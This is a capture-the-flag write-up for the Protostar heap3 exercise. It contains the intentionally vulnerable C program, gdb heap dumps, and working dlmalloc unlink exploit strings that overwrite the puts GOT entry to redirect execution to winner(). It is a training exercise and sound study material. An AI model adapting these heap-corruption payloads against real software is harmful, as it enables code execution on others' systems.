### challenge
```txt
About
This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.

This level is at /opt/protostar/bin/heap3
```

### heap3.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

### debugging
```txt
gdb -q --args ./heap3 $(python -c 'print "A"*32') $(python -c 'print "B"*32') $(python -c 'print "C"*32')

0x080488d5 <main+76>:	call   0x8048750 <strcpy@plt>
0x080488da <main+81>:	mov    0xc(%ebp),%eax
0x080488ed <main+100>:	call   0x8048750 <strcpy@plt>
0x080488f2 <main+105>:	mov    0xc(%ebp),%eax
0x08048905 <main+124>:	call   0x8048750 <strcpy@plt>
0x0804890a <main+129>:	mov    0x1c(%esp),%eax

break *main+76
break *main+81
break *main+100
break *main+105
break *main+124
break *main+129

0x08048911 <main+136>:	call   0x8049824 <free>
0x08048916 <main+141>:	mov    0x18(%esp),%eax
0x0804891d <main+148>:	call   0x8049824 <free>
0x08048922 <main+153>:	mov    0x14(%esp),%eax
0x08048929 <main+160>:	call   0x8049824 <free>
0x0804892e <main+165>:	movl   $0x804ac27,(%esp)
0x08048935 <main+172>:	call   0x8048790 <puts@plt>
0x0804893a <main+177>:	leave  
0x0804893b <main+178>:	ret    

break *main+136
break *main+141
break *main+148
break *main+153
break *main+160
break *main+165

r $(python -c 'print "A"*32') $(python -c 'print "B"*32') $(python -c 'print "C"*32')

heap = 0x804c000
x/64x 0x804c000

(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x43434343	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

25	in heap3/heap3.c
(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

Breakpoint 4, 0x0804891d in main (argc=4, argv=0xbffff7e4) at heap3/heap3.c:25
25	in heap3/heap3.c
(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x0804c050	0x42424242	0x42424242	0x42424242 <- address here..
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x0804c050	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

(gdb) x/64x 0x804c000
0x804c000:	0x00000000	0x00000029	0x0804c028	0x41414141 <- address here...
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x0804c050	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89


28	in heap3/heap3.c
(gdb) x/4x 0x0804c028
0x804c028:	0x00000000	0x00000029	0x0804c050	0x42424242
(gdb) x/4x 0x0804c050
0x804c050:	0x00000000	0x00000029	0x00000000	0x43434343


r $(python -c 'print "A"*40') $(python -c 'print "B"*40') $(python -c 'print "C"*32')
Program received signal SIGSEGV, Segmentation fault.
0x080498b9 in free (mem=0x804c030) at common/malloc.c:3631


Non-debugging symbols:
0x08048790  puts
0x08048790  puts@plt
0x08048790 <puts@plt+0>:	jmp    DWORD PTR ds:0x804b128


r $(python -c 'from struct import pack;print "A"*32 + pack("<I", 0xfffffffc)*2 + pack("<I", 0x0804b128)') $(python -c 'from struct import pack;print "B"*32 + pack("<I", 0xfffffffc)*2 + pack("<I", 0x0804b128)') $(python -c 'print "C"*32')


0x804c000:	0x00000000	0x00000029	0x41414141	0x41414141
0x804c010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804c020:	0x41414141	0x41414141	0x00000000	0x00000029
0x804c030:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c040:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c050:	0x00000000	0x00000029	0x43434343	0x43434343
0x804c060:	0x43434343	0x43434343	0x43434343	0x43434343
0x804c070:	0x43434343	0x43434343	0x00000000	0x00000f89

"A"*32 + "\xff"*8 + pack("<I", 0x804c028)0x804c050 + "B"*32

chunk 1 = [shellcode] + A x 12
chunk 2 = B x 36 + 0x65
chunk 3 = C x 32 + 0xfffffffc x 2  + [got-12] + [shellcode-12?]


# works overwrite
chunk 1 = [shellcode] + A x 12
chunk 2 = B x 32 + 0xfffffffc + '\xf0'
chunk 3 = C x 4 + 0x804b11c [got-12] + 0x804c008 [shellcode-12?]

$(python -c 'from struct import pack;print "A"*32') $(python -c 'from struct import pack;print "B"*32 + pack("<I", 0xfffffffc) + "\xf0"') $(python -c 'from struct import pack;print "C"*4 + pack("<I", 0x804b11c) + pack("<I", 0x804c008)') 


# pseudo code
chunk 1 = [shellcode] <- 0x804c008
chunk 2 = B x 16 + 0x01010101[next chunk size] + 0xffffffff[next chunk size] + "B" x 8 + + 0xfffffffc[prev chunk size -4] + 0xfffffff0[chunk size -16]
chunk 3 = C x 4 + 0x804b11c [got-12] + 0x804c008 [shellcode-12?]

# A Chunk
shellcode = "\xcc"*32

# B Chunk
b_nchunk = 0x01010101
b_padding = 0x42424242
b_nchunk_size = 0xffffffff
b_pchunk_size4 = 0xfffffffc
b_pchunk_size16 = 0xfffffff0

# C Chunk
c_padding = 0x43434343
puts_got12 = 0x804b11c
shellcode_addr = 0x804c008

a_chunk = shellcode
b_chunk = p(b_padding) + p(b_nchunk_size) + p(b_nchunk_size) + p(b_padding)*2 + p(b_pchunk_size4) + p(b_pchunk_size16)
c_chunk = p(c_padding) + p(puts_got12) + p(shellcode_addr)

#chunk 1 = [shellcode] <- 0x804c008
#chunk 2 = B x 16 + 0x01010101[next chunk size] + 0xffffffff[next chunk size] + "B" x 8 + + 0xfffffffc[prev chunk size -4] + 0xfffffff0[chunk size -16]
#chunk 3 = C x 4 + 0x804b11c [got-12] + 0x804c008 [shellcode-12?]

# $(python -c 'from struct import pack;print "\xcc"*32')
# $(python -c 'from struct import pack;print "\x42"*16 + pack("<I", 0x01010101) + pack("<I", 0xffffffff) + "\x42"*8 + pack("<I",0xfffffffc) + pack("<I",0xfffffff0)')
# $(python -c 'from struct import pack;print "\x43"*4 + pack("<I", 0x804b11c) + pack("<I", 0x804c008)')
```

### solution 1
```txt
root@kali:~/CTF/ctf/protostar# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02) 
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> disasm(asm("push 0x08048864"))
'   0:   68 64 88 04 08          push   0x8048864'
>>> disasm(asm("ret"))
'   0:   c3                      ret'

user@protostar:/opt/protostar/bin$ objdump -d heap3 | grep win
08048864 <winner>:

user@protostar:/opt/protostar/bin$ ./heap3 $(python -c 'from struct import pack;print "\x41"*12 + "\x68" + pack("<I", 0x08048864) + "\xc3" + "\x41"*14') \
> $(python -c 'from struct import pack;print "\x42"*16 + pack("<I", 0x01010101) + pack("<I", 0xffffffff) + "\x42"*8 + pack("<I",0xfffffffc) + pack("<I",0xfffffff0)') \
> $(python -c 'from struct import pack;print "\x43"*4 + pack("<I", 0x804b11c) + pack("<I", 0x804c008)')
that wasn't too bad now, was it? @ 1516264582

```
